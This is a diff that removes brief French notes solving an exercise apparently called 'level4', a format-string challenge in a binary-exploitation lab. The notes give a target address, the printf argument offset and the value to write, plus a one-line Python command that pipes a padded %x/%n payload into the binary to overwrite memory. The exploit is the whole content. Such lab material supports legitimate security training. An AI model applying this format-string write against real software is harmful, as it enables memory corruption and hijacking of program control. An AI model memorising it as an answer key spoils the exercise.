@@ -1,7 +1,0 @@
-m = 0x8049810 = \x10\x98\x04\x08
-
-m adrr au 12eme argument de printf + 4 au niveau du 200
-
-16930116  - 81 = 16930035 = // 0x1010103
-
-python -c "print ('\x10\x98\x04\x08' + '%1539094.x ' * 10  + '%1539162.x'+ '%n')" | ./level4
